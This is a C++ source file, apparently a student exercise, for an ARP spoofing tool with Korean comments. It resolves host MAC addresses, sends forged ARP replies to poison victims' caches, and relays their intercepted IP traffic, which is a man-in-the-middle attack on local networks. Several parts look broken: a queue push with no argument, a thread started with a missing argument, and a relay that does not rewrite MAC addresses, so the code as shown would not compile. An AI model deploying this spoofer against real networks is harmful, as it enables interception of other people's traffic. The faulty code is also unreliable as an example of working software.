#include "pch.h"
#include "ethhdr.h"
#include "mac.h"
#include "ip.h"
#include "arphdr.h"
#include "packetmanager.h"
#include "addressmanager.h"
#include "etharp.h"
#include "mylibnet.h"

/* message queue */
queue<string> messageQueue;
mutex mtx;
condition_variable cv;

void relayPacket(PacketManager& packetmanager,AddressManager& addrmanager){
	/* 패킷을 받고 , addrmanager안에 sender가 존재하는지 검사 */
	while(true){ 
		const u_char* packet; 
		struct pcap_pkthdr* header;
		int res = packetmanager.packetCapture(packet,header);
		struct libnet_ether_hdr* ethhdr = (struct libnet_ether_hdr*)packet;
		u_int8_t* d_mac = ethhdr->ether_dhost;
		u_int8_t* s_mac = ethhdr->ether_shost;
		u_int16_t type = ntohs(ethhdr->type);
		Mac d_mac_ = Mac(d_mac);
		Mac s_mac_ = Mac(s_mac);
		if(type!=0x0800) continue; /* ip 프로토콜이 아닐경우 폐기 */
		struct libnet_ipv4_hdr* iphdr = (struct libnet_ipv4_hdr*)(packet+sizeof(libnet_ether_hdr));
		Ip s_ip = Ip(ntohl(iphdr->ip_src.s_addr));
		Ip d_ip = Ip(ntohl(iphdr->ip_dst.s_addr));
		/*
			ip패킷 && s_ip가 ip table에 존재 && d_ip가 일치함 -> relay
		*/
		bool flag = false;
		for(int i=0;i<addrmanager.getCounter();i++){
			pair<Ip,Ip> ip_pair = addrmanager.getIpPair(i);
			string sender_ip_string = string(ip_pair.first);
			string target_ip_string = string(ip_pair.second);
			if(sender_ip_string==string(s_ip)&&target_ip_string==string(d_ip)){
				flag=true;
			}
		}
		if(!flag) continue; /* not in addrmanager */
		res = packetmanager.sendPacket(packet,header);
		if (res != 0) {
			cerr<<"error!!"<<endl;
			break;
		}
	}
}
/* 
	생산자 소비자 모델
	1.eventListner가 event를 감지
	2.message queue에 작업을 할당
	3.worker가 infection 실행
*/

/* 메시지 큐를 통한 작업수행 스레드 */
void worker(PacketManager& packetmanager,AddressManager& addrmanager){
	while (true)
    {
        string infect_target_ip = "";
        {
            std::unique_lock<std::mutex> lock(mtx);
            cv.wait(lock, []{ return !messageQueue.empty(); }); /* 메시지 큐가 비어있을경우 대기. Lamda callback으로 조건식 전달 */
            infect_target_ip = messageQueue.front();
            messageQueue.pop();
        }
        cout << "ConsumerThread: Received data: " << infect_target_ip << std::endl;
    }
}

/* 메시지 큐 작업 푸시 스레드 */
void eventListner(PacketManager& packetmanager,AddressManager& addrmanager){
	while(true){
		/* arp broadcast receive */
		const u_char* packet; 
		struct pcap_pkthdr* header;
		int res = packetmanager.packetCapture(packet,header);
		struct EthArpPacket *etharphdr = (struct EthArpPacket*)packet;
		struct EthHdr ethhdr = etharphdr->eth_;
		struct ArpHdr arphdr = etharphdr->arp_;

        {
            unique_lock<std::mutex> lock(mtx); /* mutex lock -> lifecycle : block scope */
            messageQueue.push();
        }
        cv.notify_one(); /* notify to worker */
		
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
	}
}


void producerNconsumer(PacketManager& packetmanager,AddressManager& addrmanager){
	/* spinLock이 False -> 이벤트가 감지되지 ㅏㄶ음 */
	bool event = false;
	thread t1(worker,ref(packetmanager),ref(addrmanager));
	thread t2(eventListner,ref(packetmanager),ref(addrmanager));
	t1.join();
	t2.join();
}

// 입력받은 sender ip와 target ip 페어를 u_int32_t로 저장해야겠다 안그러면, 나중에 형변환이 까다로움 
void usage() {
	printf("syntax: arp_spoofer.out <interface> {sender_ip , target_ip } ...\n");
	printf("sample: send-arp-test wlan0 1.1.1.2 1.1.1.1\n");
}

/* target_ip와 대응하는 mac주소가 올때까지 packet을 받는다 */
bool getMacFromIP(Ip target_ip,PacketManager& packetmanager,AddressManager& addrmanager){
	const u_char* packet; 
	struct pcap_pkthdr* header;
	int res = packetmanager.packetCapture(packet,header);
	struct EthArpPacket *etharphdr = (struct EthArpPacket*)packet;
	struct EthHdr ethhdr = etharphdr->eth_;
	struct ArpHdr arphdr = etharphdr->arp_;
	if(ntohs(ethhdr.type_)!=0x0806) return false;
	Ip s_ip = ntohl(arphdr.sip_);
	Mac s_mac = arphdr.smac_;
	Ip t_ip = ntohl(arphdr.tip_);
	Mac t_mac = arphdr.tmac_;
	if(string(s_ip)==string(target_ip) && string(t_mac)==string(addrmanager.getMyMac())){
		addrmanager.pushMac(s_ip,s_mac);
		return true;
	}
	else return false;
}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc%2!=0) {
		usage();
		return -1;
	}
	/* 클래스 초기화 */
	char* dev = argv[1]; 
	AddressManager addrmanager = AddressManager(string(dev));
	PacketManager packetmanager = PacketManager(string(dev));

	/* sender ip 및 target ip 페어 초기화 */
	for(int i=2;i<argc-1;i+=2){
		addrmanager.addIpPair(string(argv[i]),string(argv[i+1]));
	}
	cout<<"=======================IP 및 MAC 주소 질의 =========================="<<endl;
	/* arp request 프로토콜로 Ip들의 Mac 주소를 질의 */
    for(int i=0;i<addrmanager.getCounter();i++){
		pair<Ip,Ip> ipPair = addrmanager.getIpPair(i);
		Ip sender = ipPair.first;
		Ip target = ipPair.second;
		/* sender mac 주소 질의 */
		packetmanager.sendArpPacket("FF:FF:FF:FF:FF:FF",string(addrmanager.getMyMac()),string(addrmanager.getMyIp()),"00:00:00:00:00:00",string(sender),1);
		while(true){
			if(getMacFromIP(sender,packetmanager,addrmanager)) break;
		}
		cout<<"----------------------------------------------------------------"<<endl;
		cout<<"[X] sender"<<endl;
		cout<<"IP: "<<string(sender)<<endl;
		cout<<"MAC: "<<addrmanager.getMacString(sender)<<endl;
		/* target mac 주소 질의 */
		packetmanager.sendArpPacket("FF:FF:FF:FF:FF:FF",string(addrmanager.getMyMac()),string(addrmanager.getMyIp()),"00:00:00:00:00:00",string(target),1);
		while(true){ // 조건을 만족하는 패킷이 나올때까지 queue에 담긴 패킷을 필터링 
			if(getMacFromIP(target,packetmanager,addrmanager)) break;
		}
		cout<<"[X] target"<<endl;
		cout<<"IP: "<<string(target)<<endl;
		cout<<"MAC: "<<addrmanager.getMacString(target)<<endl;
		cout<<"-------------------------------------------------------------------"<<endl;
	}
	cout<<"======================================================================"<<endl;
	/* arp cache table 감염 */
	for(int i=0;i<addrmanager.getCounter();i++){
		pair<Ip,Ip> ipPair = addrmanager.getIpPair(i);
		Ip sender = ipPair.first;
		Ip target = ipPair.second;
		string sender_ip = string(sender);
		string target_ip = string(target);
		string sender_mac = addrmanager.getMacString(sender_ip);
		string target_mac = addrmanager.getMacString(target_ip);
		string my_mac = string(addrmanager.getMyMac());
		packetmanager.sendArpPacket(sender_mac,my_mac,target_ip,sender_mac,sender_ip,2); /* 2번 타입 reply */
	}
	/* Thread 생성 */
	/* packet relay thread 생성 */
	thread t1(relayPacket,ref(packetmanager),ref(addrmanager));
	/* arp broadcast감지 thread 생성 */
	thread t2(producerNconsumer,ref(packetmanager));
	/* 동기화 */
	t1.join();
	t2.join();
	/* 연결 종료 */
	packetmanager.close();
    return 0;
}
